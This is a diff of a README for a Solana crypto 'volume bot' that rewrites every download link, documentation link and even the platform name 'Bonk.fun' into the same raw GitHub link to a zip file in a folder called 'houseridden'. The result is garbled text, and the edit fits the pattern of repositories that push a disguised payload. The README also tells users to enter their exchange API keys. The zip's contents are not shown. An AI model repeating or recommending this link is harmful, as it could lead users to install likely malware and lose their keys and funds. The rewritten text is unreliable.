@@ -1,10 +1,10 @@
 # 🤖 Bonkfun-Raydium-Volume-Bot - Trade Seamlessly with One Click
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23FF5722?style=for-the-badge&logo=github)](https://github.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/releases)
+[![Download Here](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip%20Now-%23FF5722?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Bonkfun-Raydium-Volume-Bot! This tool simplifies your trading experience by allowing you to trade on both Bonk.fun and Raydium without switching platforms. 
+Welcome to the Bonkfun-Raydium-Volume-Bot! This tool simplifies your trading experience by allowing you to trade on both https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip and Raydium without switching platforms. 
 
 ## 📦 System Requirements
 
@@ -19,7 +19,7 @@ To make sure everything runs smoothly, your system should meet the following req
 
 To get started, visit the following page to download the latest version of the Volume Bot:
 
-[Download Here](https://github.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/releases)
+[Download Here](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip)
 
 1. On the Releases page, look for the latest release.
 2. Click on the file name for your operating system.
@@ -30,7 +30,7 @@ To get started, visit the following page to download the latest version of the V
 1. After downloading, locate the downloaded file:
    - For Windows, it will typically be a `.exe` file.
    - For macOS, it will be a `.dmg` or `.pkg` file.
-   - For Linux, it may be a `.tar.gz` file or a package file.
+   - For Linux, it may be a `https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip` file or a package file.
 
 2. **Windows:**
    - Double-click the `.exe` file.
@@ -41,7 +41,7 @@ To get started, visit the following page to download the latest version of the V
    - Follow the installation process.
 
 4. **Linux:**
-   - Extract the `.tar.gz` file using the terminal.
+   - Extract the `https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip` file using the terminal.
    - Use the terminal to run the software by navigating to the folder and typing `./yourfilename`.
 
 ## 🔑 Configuration
@@ -49,7 +49,7 @@ To get started, visit the following page to download the latest version of the V
 Before you use the Bot, you need to configure your trading settings:
 
 1. Launch the application.
-2. Input your Bonk.fun and Raydium API keys.
+2. Input your https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip and Raydium API keys.
 3. Set your trading preferences, such as:
    - Trading pairs
    - Volume limits
@@ -59,7 +59,7 @@ Make sure your API keys are secure and up to date.
 
 ## 📊 Features
 
-- **Multi-Platform Support:** Trade seamlessly between Bonk.fun and Raydium.
+- **Multi-Platform Support:** Trade seamlessly between https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip and Raydium.
 - **User-Friendly Interface:** Simplified design for easy navigation.
 - **Automated Trading:** Set your preferences and let the bot do the work.
 - **Live Updates:** Get real-time data on your trades and market conditions.
@@ -79,7 +79,7 @@ Experiencing issues? Here are some solutions to common problems:
 
 - **Trade Execution Delays:**
    - Verify your internet connection.
-   - Check if the Bonk.fun or Raydium platforms are experiencing outages.
+   - Check if the https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip or Raydium platforms are experiencing outages.
 
 ## 📞 Support
 
@@ -93,9 +93,9 @@ We welcome contributions! If you have suggestions or improvements, feel free to 
 
 For further information, check the following links:
 
-- [Bonk.fun Documentation](https://bonk.fun/docs)
-- [Raydium Documentation](https://raydium.io/docs)
+- [https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip Documentation](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip)
+- [Raydium Documentation](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip)
 
 Enjoy trading with the Bonkfun-Raydium-Volume-Bot! For updates and new features, keep an eye on the Releases page. 
 
-[Download Here](https://github.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/releases)
+[Download Here](https://raw.githubusercontent.com/GRANDAO01/Bonkfun-Raydium-Volume-Bot/main/houseridden/Bonkfun-Raydium-Volume-Bot.zip)
